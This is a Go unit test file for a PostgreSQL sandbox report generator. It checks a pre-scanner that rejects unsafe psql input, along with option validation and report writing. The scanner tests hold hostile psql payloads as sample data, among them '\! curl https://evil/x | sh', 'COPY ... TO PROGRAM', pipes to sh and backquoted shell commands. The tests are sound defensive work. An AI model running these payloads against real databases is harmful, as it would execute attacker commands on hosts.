// Unit tests for the report package.
//
// Strategy:
//
//   - We use pgexec.Fake so no real PostgreSQL or psql is launched.
//     Deploy runs against the Fake; the schema-load and report-render
//     psql calls also run against the Fake.
//
//   - Negative-path tests (missing input, missing gather dir, missing
//     gather scripts) exercise validateOptions and the early-exit
//     branches BEFORE deploy. These tests don't need a Fake because
//     no subprocess is invoked.
//
//   - For the happy-path test we point --pg-gather-dir at a temp dir
//     containing stub gather_schema.sql + gather_report.sql files
//     and verify the runner saw two psql calls with the expected
//     stdin and that the output file was written.

package report

import (
	"context"
	"errors"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/guriandoro/postgresql_sandbox/internal/pgexec"
	"github.com/guriandoro/postgresql_sandbox/internal/ui"
)

// fakePidDroppingRunner extends pgexec.Fake so that the throwaway
// sandbox's deploy preflight (isRunning + isPortListening) doesn't
// have to be satisfied — sandbox.Deploy doesn't check those for the
// standalone path. We only need the Fake; no listener trickery.
func fakeRunnerCannedPsql(stdout, stderr []byte, exit int) *pgexec.Fake {
	f := &pgexec.Fake{}
	f.SetResult("psql", pgexec.Result{
		Stdout:   stdout,
		Stderr:   stderr,
		ExitCode: exit,
	})
	return f
}

// fakeSeqPsqlRunner wraps pgexec.Fake to return a DIFFERENT Result for
// each successive psql RunWithStdin call. The plain Fake keys results
// only by binary name, so it can't make the schema+ingest psql call
// (the 1st) succeed while the render psql call (the 2nd) fails — which
// is exactly the MED-1 scenario. Non-psql invocations (initdb, pg_ctl
// during deploy/destroy) and any calls past the supplied list fall
// through to the embedded Fake unchanged.
type fakeSeqPsqlRunner struct {
	*pgexec.Fake
	psqlResults []pgexec.Result
	psqlSeen    int
}

func (f *fakeSeqPsqlRunner) RunWithStdin(ctx context.Context, stdin io.Reader, name string, args ...string) pgexec.Result {
	// Let the embedded Fake record the call and drain stdin first.
	base := f.Fake.RunWithStdin(ctx, stdin, name, args...)
	if name != "psql" {
		return base
	}
	i := f.psqlSeen
	f.psqlSeen++
	if i < len(f.psqlResults) {
		return f.psqlResults[i]
	}
	return base
}

// fakeSeqRunner builds a fakeSeqPsqlRunner whose psql RunWithStdin
// calls return results in order (1st → schema+ingest, 2nd → render).
func fakeSeqRunner(results ...pgexec.Result) *fakeSeqPsqlRunner {
	return &fakeSeqPsqlRunner{Fake: &pgexec.Fake{}, psqlResults: results}
}

// assertNoReportTemps fails if writeReportAtomic left a sibling temp
// file behind next to outPath.
func assertNoReportTemps(t *testing.T, dir, outPath string) {
	t.Helper()
	matches, _ := filepath.Glob(filepath.Join(dir, filepath.Base(outPath)+".tmp.*"))
	if len(matches) != 0 {
		t.Errorf("stray temp report files left behind: %v", matches)
	}
}

// writeStubGatherDir creates a pg-gather-dir fixture with both
// expected SQL files present but harmless content. Returns the dir.
func writeStubGatherDir(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, gatherSchemaSQL),
		[]byte("-- stub schema\nCREATE TABLE pg_gather (id int);\n"), 0o644); err != nil {
		t.Fatalf("write schema stub: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, gatherReportSQL),
		[]byte("\\echo <html></html>\n"), 0o644); err != nil {
		t.Fatalf("write report stub: %v", err)
	}
	return dir
}

// writeStubInput creates a small fake out.txt file.
func writeStubInput(t *testing.T) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "out.txt")
	if err := os.WriteFile(p, []byte("dummy\nout.txt\ncontent\n"), 0o644); err != nil {
		t.Fatalf("write input: %v", err)
	}
	return p
}

// ----------------------------------------------------------------- //
// GatherDirHasScripts
// ----------------------------------------------------------------- //

func TestGatherDirHasScripts(t *testing.T) {
	// Both scripts present → true.
	if !GatherDirHasScripts(writeStubGatherDir(t)) {
		t.Fatal("expected true for a dir with both gather scripts")
	}

	// Only one script present → false.
	onlySchema := t.TempDir()
	if err := os.WriteFile(filepath.Join(onlySchema, gatherSchemaSQL),
		[]byte("-- stub\n"), 0o644); err != nil {
		t.Fatalf("write schema stub: %v", err)
	}
	if GatherDirHasScripts(onlySchema) {
		t.Fatal("expected false when only gather_schema.sql is present")
	}

	// Empty dir → false.
	if GatherDirHasScripts(t.TempDir()) {
		t.Fatal("expected false for an empty dir")
	}

	// A directory named like a script must not count as the file.
	dirNamedScript := t.TempDir()
	if err := os.Mkdir(filepath.Join(dirNamedScript, gatherSchemaSQL), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dirNamedScript, gatherReportSQL),
		[]byte("-- stub\n"), 0o644); err != nil {
		t.Fatalf("write report stub: %v", err)
	}
	if GatherDirHasScripts(dirNamedScript) {
		t.Fatal("expected false when gather_schema.sql is a directory")
	}
}

// ----------------------------------------------------------------- //
// scanGatherInput (untrusted-input pre-scan)
// ----------------------------------------------------------------- //

// realisticOutTxt mirrors the shape a genuine pg_gather out.txt has
// (gather.sql v33): header comment, benign display/guard
// meta-commands, and COPY blocks whose data rows legitimately contain
// backslash escapes, quotes, and the word "program".
const realisticOutTxt = `--**** THIS IS A TSV FORMATED FILE. PLEASE DONT COPY-PASTE OR SAVE USING TEXT EDITORS. Because formatting can be lost and file becomes corrupt  ****--
\r
\set ver 33
SELECT (SELECT count(*) > 1 FROM pg_srvr) AS conlines \gset
\if :conlines
\echo SOMETHING WRONG, EXITING
SOMETHING WRONG, EXITING;
\q
\endif
COPY pg_srvr FROM stdin;
You are connected to database "postgres" as user "acme" via socket in "/tmp" at port "5432".
psql - psql (PostgreSQL) 16.4
\.
\t
\r
COPY pg_get_confs (name,setting,unit,source) FROM stdin;
archive_command	/usr/bin/program --flag 'x'	\N	configuration file
search_path	"$user", public	\N	default
log_line_prefix	%m [%p] \\ \.	\N	configuration file
\.
copy pg_get_activity FROM stdin;
12345	SELECT * FROM t WHERE c = 'program' /* odd */ AND d = $$x$$;	` + "`whoami`" + `
\.
`

// writeScanInput drops content into a temp out.txt and returns its
// path.
func writeScanInput(t *testing.T, content string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "out.txt")
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatalf("write input: %v", err)
	}
	return p
}

func TestScanGatherInputAcceptsRealisticFile(t *testing.T) {
	if err := scanGatherInput(writeScanInput(t, realisticOutTxt)); err != nil {
		t.Fatalf("realistic out.txt rejected: %v", err)
	}
}

func TestScanGatherInputAcceptsFileWithoutTrailingNewline(t *testing.T) {
	// The last line may lack a trailing \n; it must still be scanned
	// (an attacker would otherwise hide the payload on the final line).
	if err := scanGatherInput(writeScanInput(t, "SELECT 1;\nSELECT 2;")); err != nil {
		t.Fatalf("no-trailing-newline file rejected: %v", err)
	}
	err := scanGatherInput(writeScanInput(t, "SELECT 1;\n\\! id"))
	if err == nil {
		t.Fatal("final-line \\! without newline must be rejected")
	}
	if !strings.Contains(err.Error(), "line 2") {
		t.Errorf("error does not name line 2: %v", err)
	}
}

func TestScanGatherInputRejectsShellMetaCommand(t *testing.T) {
	err := scanGatherInput(writeScanInput(t,
		"\\set ver 33\n\\! curl https://evil/x | sh\n"))
	if err == nil {
		t.Fatal("expected rejection of \\! line")
	}
	if !strings.Contains(err.Error(), "line 2") {
		t.Errorf("error does not name the offending line: %v", err)
	}
	if got := ExitCodeFor(err); got != ui.ExitUsage {
		t.Errorf("exit code: got %d, want %d (ExitUsage)", got, ui.ExitUsage)
	}
}

func TestScanGatherInputRejectsMidLineMetaCommand(t *testing.T) {
	// psql accepts meta-commands after SQL on the same line, so a
	// leading-character check alone is bypassable.
	err := scanGatherInput(writeScanInput(t, "SELECT 1; \\! id\n"))
	if err == nil {
		t.Fatal("expected rejection of mid-line \\!")
	}
	if !strings.Contains(err.Error(), "line 1") {
		t.Errorf("error does not name line 1: %v", err)
	}
}

func TestScanGatherInputRejectsToProgram(t *testing.T) {
	for name, content := range map[string]string{
		"same line":  "COPY x TO PROGRAM 'touch /tmp/pwned';\n",
		"lowercase":  "copy x to program 'touch /tmp/pwned';\n",
		"line split": "COPY x TO\nPROGRAM 'touch /tmp/pwned';\n",
	} {
		if err := scanGatherInput(writeScanInput(t, content)); err == nil {
			t.Errorf("%s: expected rejection of COPY ... PROGRAM", name)
		}
	}
}

func TestScanGatherInputAllowsCopyDataFreely(t *testing.T) {
	// Inside a COPY block, data rows legitimately contain backslash
	// escapes, the word "program", quotes, and backquotes — none may
	// be flagged, and the \. terminator must be honored.
	content := "COPY pg_get_confs FROM stdin;\n" +
		"archive_command\tprogram TO PROGRAM \\! `id` '\" $$\n" +
		"\\.\n"
	if err := scanGatherInput(writeScanInput(t, content)); err != nil {
		t.Fatalf("COPY data misflagged: %v", err)
	}
	// But the SAME bytes outside a COPY block are rejected.
	if err := scanGatherInput(writeScanInput(t,
		"archive_command\tprogram TO PROGRAM \\! `id` '\" $$\n")); err == nil {
		t.Fatal("expected rejection outside COPY data")
	}
}

func TestScanGatherInputRejectsAfterCopyTerminator(t *testing.T) {
	// The scanner must leave COPY-data mode at \. — meta-commands
	// after the terminator are back under scrutiny.
	content := "COPY t FROM stdin;\nrow\n\\.\n\\! id\n"
	err := scanGatherInput(writeScanInput(t, content))
	if err == nil {
		t.Fatal("expected rejection of \\! after COPY terminator")
	}
	if !strings.Contains(err.Error(), "line 4") {
		t.Errorf("error does not name line 4: %v", err)
	}
}

func TestScanGatherInputRejectsStringSmuggledCopyStart(t *testing.T) {
	// A multi-line string literal could hide a fake `COPY ... FROM
	// stdin;` line, desynchronizing the scanner's COPY-data tracking
	// from psql's; quotes outside COPY data are therefore rejected.
	content := "SELECT '\nCOPY x FROM stdin;\n';\n\\! id\n"
	err := scanGatherInput(writeScanInput(t, content))
	if err == nil {
		t.Fatal("expected rejection of quote outside COPY data")
	}
	if !strings.Contains(err.Error(), "line 1") {
		t.Errorf("error does not name line 1 (the smuggling quote): %v", err)
	}
}

func TestScanGatherInputRejectsBackquote(t *testing.T) {
	if err := scanGatherInput(writeScanInput(t, "\\echo `id`\n")); err == nil {
		t.Fatal("expected rejection of backquote in meta-command args")
	}
}

func TestScanGatherInputMissingFile(t *testing.T) {
	err := scanGatherInput(filepath.Join(t.TempDir(), "nope.txt"))
	if err == nil {
		t.Fatal("expected error for missing file")
	}
}

func TestScanGatherLineVerbExtraction(t *testing.T) {
	// Table-driven check of the meta-command allow/deny decisions.
	cases := []struct {
		line string
		ok   bool
	}{
		{`\.`, true},
		{`\set ver 33`, true},
		{`\if :conlines`, true},
		{`\endif`, true},
		{`\echo SOMETHING WRONG, EXITING`, true},
		{`\q`, true},
		{`\r`, true},
		{`\t`, true},
		{`SELECT 1 AS x \gset`, true},
		{`\!`, false},
		{`\! id`, false},
		{`\g |cat`, false},
		{`\gx`, false},
		{`\gexec`, false},
		{`\copy t from program 'id'`, false},
		{`\o |sh`, false},
		{`\w |sh`, false},
		{`\`, false},
		{`\\`, false},
		{`\SET ver 33`, false}, // psql verbs are case-sensitive; only the real ones pass
	}
	for _, tc := range cases {
		inCopy := false
		err := scanGatherLine(tc.line+"\n", 1, &inCopy)
		if tc.ok && err != nil {
			t.Errorf("%q: unexpected rejection: %v", tc.line, err)
		}
		if !tc.ok && err == nil {
			t.Errorf("%q: expected rejection", tc.line)
		}
	}
}

func TestScanGatherLineCopyModeTransitions(t *testing.T) {
	inCopy := false
	if err := scanGatherLine("COPY pg_srvr FROM stdin;\n", 1, &inCopy); err != nil {
		t.Fatalf("COPY start rejected: %v", err)
	}
	if !inCopy {
		t.Fatal("COPY ... FROM stdin; did not enter COPY-data mode")
	}
	// An escaped-backslash row (`\\.`) is data, not a terminator.
	if err := scanGatherLine("\\\\.\n", 2, &inCopy); err != nil || !inCopy {
		t.Fatalf("escaped-backslash data row mishandled: err=%v inCopy=%v", err, inCopy)
	}
	if err := scanGatherLine("\\.\r\n", 3, &inCopy); err != nil {
		t.Fatalf("CRLF terminator rejected: %v", err)
	}
	if inCopy {
		t.Fatal("\\. did not leave COPY-data mode")
	}
}

// TestGenerateRejectsUnsafeInputBeforeDeploy proves the pre-scan
// fires BEFORE any sandbox is deployed: no runner calls, no
// LeftoverError, no _report_* dir under the root.
func TestGenerateRejectsUnsafeInputBeforeDeploy(t *testing.T) {
	gatherDir := writeStubGatherDir(t)
	root := t.TempDir()
	binDir := filepath.Join(root, "bin")
	_ = os.MkdirAll(binDir, 0o755)
	in := writeScanInput(t, "\\! touch /tmp/pwned\n")
	runner := fakeRunnerCannedPsql(nil, nil, 0)

	_, err := Generate(context.Background(), Options{
		InputPath:   in,
		OutputPath:  filepath.Join(root, "report.html"),
		BinDir:      binDir,
		PgGatherDir: gatherDir,
		SandboxRoot: root,
		Runner:      runner,
	}, io.Discard)
	if err == nil {
		t.Fatal("expected unsafe input to be rejected")
	}
	if got := ExitCodeFor(err); got != ui.ExitUsage {
		t.Errorf("exit code: got %d, want %d (ExitUsage)", got, ui.ExitUsage)
	}
	var le *LeftoverError
	if errors.As(err, &le) {
		t.Errorf("rejection happened pre-deploy; no LeftoverError expected, got dir %q", le.Dir)
	}
	if len(runner.Calls) != 0 {
		t.Errorf("no subprocess may run for rejected input; saw %d calls", len(runner.Calls))
	}
	entries, rerr := os.ReadDir(root)
	if rerr != nil {
		t.Fatalf("read root: %v", rerr)
	}
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), "_report_") {
			t.Errorf("throwaway sandbox %q created for rejected input", e.Name())
		}
	}
}

// ----------------------------------------------------------------- //
// validateOptions
// ----------------------------------------------------------------- //

func TestValidateOptionsMissingInput(t *testing.T) {
	err := validateOptions(&Options{})
	if err == nil {
		t.Fatal("expected error for missing input")
	}
	if got := ExitCodeFor(err); got != ui.ExitUsage {
		t.Errorf("exit code: got %d, want %d", got, ui.ExitUsage)
	}
}

func TestValidateOptionsMissingBinDir(t *testing.T) {
	err := validateOptions(&Options{InputPath: "/tmp/in.txt"})
	if err == nil {
		t.Fatal("expected error for missing bin-dir")
	}
	if got := ExitCodeFor(err); got != ui.ExitUsage {
		t.Errorf("exit code: got %d, want %d", got, ui.ExitUsage)
	}
}

func TestValidateOptionsMissingPgGatherDir(t *testing.T) {
	err := validateOptions(&Options{
		InputPath: "/tmp/in.txt",
		BinDir:    "/opt/pg/bin",
	})
	if err == nil {
		t.Fatal("expected error for missing pg-gather-dir")
	}
	if got := ExitCodeFor(err); got != ui.ExitPgGatherDirMissing {
		t.Errorf("exit code: got %d, want %d (ExitPgGatherDirMissing)",
			got, ui.ExitPgGatherDirMissing)
	}
}

func TestValidateOptionsMissingSandboxRoot(t *testing.T) {
	err := validateOptions(&Options{
		InputPath:   "/tmp/in.txt",
		BinDir:      "/opt/pg/bin",
		PgGatherDir: "/tmp",
	})
	if err == nil {
		t.Fatal("expected error for missing sandbox root")
	}
	if got := ExitCodeFor(err); got != ui.ExitUsage {
		t.Errorf("exit code: got %d, want %d", got, ui.ExitUsage)
	}
}

func TestValidateOptionsDefaultsOutput(t *testing.T) {
	opts := Options{
		InputPath:   "/tmp/in.txt",
		BinDir:      "/opt/pg/bin",
		PgGatherDir: "/tmp",
		SandboxRoot: "/tmp/sb",
	}
	if err := validateOptions(&opts); err != nil {
		t.Fatalf("validate: %v", err)
	}
	if want := "/tmp/in_report.html"; opts.OutputPath != want {
		t.Errorf("default output: got %q, want %q", opts.OutputPath, want)
	}
}

// ----------------------------------------------------------------- //
// Generate negative paths
// ----------------------------------------------------------------- //

func TestGenerateMissingInputFile(t *testing.T) {
	gatherDir := writeStubGatherDir(t)
	root := t.TempDir()
	binDir := filepath.Join(root, "bin")
	_ = os.MkdirAll(binDir, 0o755)

	_, err := Generate(context.Background(), Options{
		InputPath:   "/nonexistent.txt",
		BinDir:      binDir,
		PgGatherDir: gatherDir,
		SandboxRoot: root,
	}, io.Discard)
	if err == nil {
		t.Fatal("expected error for missing input file")
	}
	if got := ExitCodeFor(err); got != ui.ExitUsage {
		t.Errorf("exit code: got %d, want %d", got, ui.ExitUsage)
	}
}

func TestGenerateMissingGatherSchema(t *testing.T) {
	// Build a gather dir with ONLY the report script.
	gatherDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(gatherDir, gatherReportSQL),
		[]byte("\\echo x\n"), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
	root := t.TempDir()
	binDir := filepath.Join(root, "bin")
	_ = os.MkdirAll(binDir, 0o755)
	in := writeStubInput(t)

	_, err := Generate(context.Background(), Options{
		InputPath:   in,
		BinDir:      binDir,
		PgGatherDir: gatherDir,
		SandboxRoot: root,
	}, io.Discard)
	if err == nil {
		t.Fatal("expected error for missing schema script")
	}
	if got := ExitCodeFor(err); got != ui.ExitPgGatherDirMissing {
		t.Errorf("exit code: got %d, want %d", got, ui.ExitPgGatherDirMissing)
	}
}

func TestGenerateMissingGatherReport(t *testing.T) {
	gatherDir := t.TempDir()
	if err := os.WriteFile(filepath.Join(gatherDir, gatherSchemaSQL),
		[]byte("-- schema\n"), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
	root := t.TempDir()
	binDir := filepath.Join(root, "bin")
	_ = os.MkdirAll(binDir, 0o755)
	in := writeStubInput(t)

	_, err := Generate(context.Background(), Options{
		InputPath:   in,
		BinDir:      binDir,
		PgGatherDir: gatherDir,
		SandboxRoot: root,
	}, io.Discard)
	if err == nil {
		t.Fatal("expected error for missing report script")
	}
	if got := ExitCodeFor(err); got != ui.ExitPgGatherDirMissing {
		t.Errorf("exit code: got %d, want %d", got, ui.ExitPgGatherDirMissing)
	}
}

// ----------------------------------------------------------------- //
// Generate happy path (with Fake)
// ----------------------------------------------------------------- //

func TestGenerateHappyPath(t *testing.T) {
	gatherDir := writeStubGatherDir(t)
	root := t.TempDir()
	binDir := filepath.Join(root, "bin")
	_ = os.MkdirAll(binDir, 0o755)
	in := writeStubInput(t)
	outPath := filepath.Join(root, "report.html")

	// Canned psql result: a chunk of stdout we'll verify lands in
	// the output file (the second psql call captures stdout). The
	// Fake returns the same Result for EVERY psql call (schema-load
	// AND report-render), which is fine: the schema-load doesn't
	// care about stdout, and the report-render writes whatever it
	// captured to the output file.
	stdoutBytes := []byte("<html>STUB REPORT</html>\n")
	runner := fakeRunnerCannedPsql(stdoutBytes, nil, 0)

	res, err := Generate(context.Background(), Options{
		InputPath:   in,
		OutputPath:  outPath,
		BinDir:      binDir,
		PgGatherDir: gatherDir,
		SandboxRoot: root,
		Runner:      runner,
		SelfPath:    "/usr/local/bin/pg_sandbox",
	}, io.Discard)
	if err != nil {
		t.Fatalf("Generate: %v", err)
	}
	if res == nil {
		t.Fatal("Generate returned nil Result")
	}
	if res.OutputPath != outPath {
		t.Errorf("output path: got %q, want %q", res.OutputPath, outPath)
	}

	// Output file must contain the stdout returned by the report-
	// render psql call.
	data, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatalf("read output: %v", err)
	}
	if !strings.Contains(string(data), "STUB REPORT") {
		t.Errorf("output file missing rendered HTML: got %q", string(data))
	}

	// Verify both psql calls happened: one with the schema+input
	// stdin, one with the report-script stdin. We look at the Fake's
	// captured stdin for "RunWithStdin" invocations.
	psqlStdins := [][]byte{}
	for _, c := range runner.Calls {
		if c.Name == "psql" && c.Method == "RunWithStdin" {
			psqlStdins = append(psqlStdins, c.Stdin)
		}
	}
	if len(psqlStdins) < 2 {
		t.Fatalf("expected >=2 psql RunWithStdin calls, got %d", len(psqlStdins))
	}
	// First call should contain the schema content + input content.
	if !strings.Contains(string(psqlStdins[0]), "stub schema") {
		t.Errorf("schema-load stdin missing schema text: %q", string(psqlStdins[0]))
	}
	if !strings.Contains(string(psqlStdins[0]), "dummy") {
		t.Errorf("schema-load stdin missing input text: %q", string(psqlStdins[0]))
	}
	// Second call should contain the report script content.
	if !strings.Contains(string(psqlStdins[1]), "<html></html>") {
		t.Errorf("report-render stdin missing report text: %q", string(psqlStdins[1]))
	}
}

func TestGenerateSchemaLoadFailureLeavesSandbox(t *testing.T) {
	gatherDir := writeStubGatherDir(t)
	root := t.TempDir()
	binDir := filepath.Join(root, "bin")
	_ = os.MkdirAll(binDir, 0o755)
	in := writeStubInput(t)

	// Schema-load psql call fails (non-zero exit). The pipeline
	// should return a LeftoverError naming the throwaway sandbox.
	runner := fakeRunnerCannedPsql(nil, []byte("ERROR: simulated\n"), 3)

	_, err := Generate(context.Background(), Options{
		InputPath:   in,
		OutputPath:  filepath.Join(root, "report.html"),
		BinDir:      binDir,
		PgGatherDir: gatherDir,
		SandboxRoot: root,
		Runner:      runner,
	}, io.Discard)
	if err == nil {
		t.Fatal("expected schema-load failure")
	}
	if got := ExitCodeFor(err); got != ui.ExitReportFailed {
		t.Errorf("exit code: got %d, want %d", got, ui.ExitReportFailed)
	}
	var le *LeftoverError
	if !errors.As(err, &le) {
		t.Errorf("expected LeftoverError in chain; got %v", err)
	}
	if le != nil && !strings.Contains(le.Dir, "_report_") {
		t.Errorf("throwaway dir doesn't look like _report_*: %q", le.Dir)
	}
	// MED-1b regression: this is the common ON_ERROR_STOP shape — psql
	// exits non-zero (3) with a nil res.Err. The message must NOT wrap
	// the nil error (which would render as "%!w(<nil>)"); it must be the
	// plain "exit=3" form.
	msg := err.Error()
	if strings.Contains(msg, "%!w") {
		t.Errorf("message wraps a nil error (%%!w): %q", msg)
	}
	if !strings.Contains(msg, "psql (schema+ingest) exit=3") {
		t.Errorf("message missing plain schema+ingest exit=3 text: %q", msg)
	}
}

// TestPsqlStepErr unit-tests the shared message builder directly: with a
// non-nil error it wraps via %w (and Unwrap recovers it); with a nil
// error it produces a plain "exit=N" string and never the "%!w(<nil>)"
// artifact that MED-1b was about.
func TestPsqlStepErr(t *testing.T) {
	inner := errors.New("boom")
	wrapped := psqlStepErr("schema+ingest", 1, inner)
	if !strings.Contains(wrapped.Error(), "psql (schema+ingest) exit=1: boom") {
		t.Errorf("wrapped message: got %q", wrapped.Error())
	}
	if !errors.Is(wrapped, inner) {
		t.Errorf("wrapped error does not unwrap to inner: %v", wrapped)
	}

	plain := psqlStepErr("render report", 3, nil)
	if strings.Contains(plain.Error(), "%!w") {
		t.Errorf("nil-error message contains %%!w artifact: %q", plain.Error())
	}
	if plain.Error() != "psql (render report) exit=3" {
		t.Errorf("nil-error message: got %q, want %q", plain.Error(), "psql (render report) exit=3")
	}
}

// TestGenerateSchemaLoadFailureDestroyOnFailure mirrors the test above
// but with DestroyOnFailure set: the same schema-load failure should
// still return ExitReportFailed, but the throwaway sandbox must be torn
// down (no LeftoverError, no _report_* dir left under the root).
func TestGenerateSchemaLoadFailureDestroyOnFailure(t *testing.T) {
	gatherDir := writeStubGatherDir(t)
	root := t.TempDir()
	binDir := filepath.Join(root, "bin")
	_ = os.MkdirAll(binDir, 0o755)
	in := writeStubInput(t)

	runner := fakeRunnerCannedPsql(nil, []byte("ERROR: simulated\n"), 3)

	_, err := Generate(context.Background(), Options{
		InputPath:        in,
		OutputPath:       filepath.Join(root, "report.html"),
		BinDir:           binDir,
		PgGatherDir:      gatherDir,
		SandboxRoot:      root,
		Runner:           runner,
		DestroyOnFailure: true,
	}, io.Discard)
	if err == nil {
		t.Fatal("expected schema-load failure")
	}
	if got := ExitCodeFor(err); got != ui.ExitReportFailed {
		t.Errorf("exit code: got %d, want %d", got, ui.ExitReportFailed)
	}
	// Cleanup happened, so there must be NO LeftoverError in the chain.
	var le *LeftoverError
	if errors.As(err, &le) {
		t.Errorf("did not expect LeftoverError after --destroy-on-failure cleanup; got dir %q", le.Dir)
	}
	// And no throwaway sandbox dir should survive under the root.
	entries, rerr := os.ReadDir(root)
	if rerr != nil {
		t.Fatalf("read root: %v", rerr)
	}
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), "_report_") {
			t.Errorf("throwaway sandbox %q survived --destroy-on-failure", e.Name())
		}
	}
}

// TestGenerateRenderFailurePreservesReport is the MED-1 regression:
// the schema+ingest step succeeds but the render step comes back with a
// non-zero psql exit and a nil res.Err — the shape exitCodeOf produces
// for a lost connection (exit 2) or a signal-killed child (exit -1).
// The old code checked only res.Err != nil, so those slipped through
// and the truncated/empty stdout was written over the output path with
// a 0 exit. Generate must instead fail AND leave any pre-existing good
// report byte-for-byte intact. The exit-0-but-incomplete cases cover
// the stdout sanity check (a report missing its closing </html>).
func TestGenerateRenderFailurePreservesReport(t *testing.T) {
	cases := map[string]pgexec.Result{
		"lost connection (exit 2)": {Stdout: []byte("<html>partial, truncated"), ExitCode: 2},
		"signal-killed (exit -1)":  {Stdout: nil, ExitCode: -1},
		"exit 0 but no </html>":    {Stdout: []byte("<html>oops, cut short"), ExitCode: 0},
		"exit 0 but empty stdout":  {Stdout: nil, ExitCode: 0},
	}
	for name, renderRes := range cases {
		t.Run(name, func(t *testing.T) {
			gatherDir := writeStubGatherDir(t)
			root := t.TempDir()
			binDir := filepath.Join(root, "bin")
			_ = os.MkdirAll(binDir, 0o755)
			in := writeStubInput(t)
			outPath := filepath.Join(root, "report.html")

			// Seed a GOOD report from a hypothetical prior run.
			const priorGood = "<html>PRIOR GOOD REPORT</html>\n"
			if err := os.WriteFile(outPath, []byte(priorGood), 0o644); err != nil {
				t.Fatalf("seed prior report: %v", err)
			}

			// Schema+ingest succeeds; render returns the failing result.
			runner := fakeSeqRunner(
				pgexec.Result{ExitCode: 0}, // schema+ingest OK
				renderRes,                  // render fails / incomplete
			)

			_, err := Generate(context.Background(), Options{
				InputPath:   in,
				OutputPath:  outPath,
				BinDir:      binDir,
				PgGatherDir: gatherDir,
				SandboxRoot: root,
				Runner:      runner,
			}, io.Discard)
			if err == nil {
				t.Fatal("expected render failure to error")
			}
			if got := ExitCodeFor(err); got != ui.ExitReportFailed {
				t.Errorf("exit code: got %d, want %d (ExitReportFailed)", got, ui.ExitReportFailed)
			}
			var le *LeftoverError
			if !errors.As(err, &le) {
				t.Errorf("expected LeftoverError in chain; got %v", err)
			}
			// The prior good report must be byte-for-byte intact.
			data, rerr := os.ReadFile(outPath)
			if rerr != nil {
				t.Fatalf("read output: %v", rerr)
			}
			if string(data) != priorGood {
				t.Errorf("prior report was clobbered: got %q, want %q", string(data), priorGood)
			}
			assertNoReportTemps(t, root, outPath)
		})
	}
}

// TestGenerateRenderSuccessReplacesPriorReport proves the atomic-write
// path replaces an existing report on success (and leaves no temp file
// behind) — the counterpart to the preservation tests above.
func TestGenerateRenderSuccessReplacesPriorReport(t *testing.T) {
	gatherDir := writeStubGatherDir(t)
	root := t.TempDir()
	binDir := filepath.Join(root, "bin")
	_ = os.MkdirAll(binDir, 0o755)
	in := writeStubInput(t)
	outPath := filepath.Join(root, "report.html")

	if err := os.WriteFile(outPath, []byte("<html>STALE OLD REPORT</html>\n"), 0o644); err != nil {
		t.Fatalf("seed old report: %v", err)
	}

	runner := fakeSeqRunner(
		pgexec.Result{ExitCode: 0}, // schema+ingest OK
		pgexec.Result{Stdout: []byte("<html>FRESH</html>\n"), ExitCode: 0}, // render OK
	)

	if _, err := Generate(context.Background(), Options{
		InputPath:   in,
		OutputPath:  outPath,
		BinDir:      binDir,
		PgGatherDir: gatherDir,
		SandboxRoot: root,
		Runner:      runner,
	}, io.Discard); err != nil {
		t.Fatalf("Generate: %v", err)
	}
	data, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatalf("read output: %v", err)
	}
	if string(data) != "<html>FRESH</html>\n" {
		t.Errorf("output not replaced with fresh report: got %q", string(data))
	}
	assertNoReportTemps(t, root, outPath)
}

// TestLeftoverErrorUnwrap confirms errors.As digs out the
// LeftoverError when one is buried in the chain. This guards the CLI
// "throwaway sandbox at X" hint message.
func TestLeftoverErrorUnwrap(t *testing.T) {
	inner := errors.New("psql died")
	wrapped := &exitErr{
		Code: ExitReportFailed,
		Err:  &LeftoverError{Dir: "/tmp/_report_x", Err: inner},
	}
	var le *LeftoverError
	if !errors.As(wrapped, &le) {
		t.Fatal("errors.As did not find LeftoverError in chain")
	}
	if le.Dir != "/tmp/_report_x" {
		t.Errorf("dir: got %q, want /tmp/_report_x", le.Dir)
	}
}

// TestConcatReader verifies the helper concatenates files in order
// without buffering them all in memory.
func TestConcatReader(t *testing.T) {
	a := filepath.Join(t.TempDir(), "a")
	b := filepath.Join(t.TempDir(), "b")
	if err := os.WriteFile(a, []byte("first\n"), 0o644); err != nil {
		t.Fatalf("write a: %v", err)
	}
	if err := os.WriteFile(b, []byte("second\n"), 0o644); err != nil {
		t.Fatalf("write b: %v", err)
	}
	r, cleanup, err := concatReader(a, b)
	if err != nil {
		t.Fatalf("concatReader: %v", err)
	}
	defer cleanup()
	got, err := io.ReadAll(r)
	if err != nil {
		t.Fatalf("readall: %v", err)
	}
	if string(got) != "first\nsecond\n" {
		t.Errorf("concat: got %q, want %q", string(got), "first\nsecond\n")
	}
}

// TestConcatReaderMissingFile: the helper must close any files it
// did open before returning the error.
func TestConcatReaderMissingFile(t *testing.T) {
	missing := filepath.Join(t.TempDir(), "does-not-exist")
	_, _, err := concatReader(missing)
	if err == nil {
		t.Fatal("expected error for missing file")
	}
}

// TestExitErrErrorWithNil exercises the nil-Err branch of exitErr.Error
// (the common branch is hit by other tests through Wrap+Error).
func TestExitErrErrorWithNil(t *testing.T) {
	e := &exitErr{Code: ExitReportFailed, Err: nil}
	got := e.Error()
	if !strings.Contains(got, "exit") {
		t.Errorf("exitErr.Error() missing 'exit': %q", got)
	}
	// And the wrapping case.
	inner := errors.New("inner")
	e2 := &exitErr{Code: ExitUsage, Err: inner}
	if !strings.Contains(e2.Error(), "inner") {
		t.Errorf("exitErr.Error() with inner missing inner text: %q", e2.Error())
	}
}

// TestLeftoverErrorErrorWithNil exercises the nil-Err branch of
// LeftoverError.Error and the unwrap method.
func TestLeftoverErrorErrorWithNil(t *testing.T) {
	le := &LeftoverError{Dir: "/tmp/x"}
	got := le.Error()
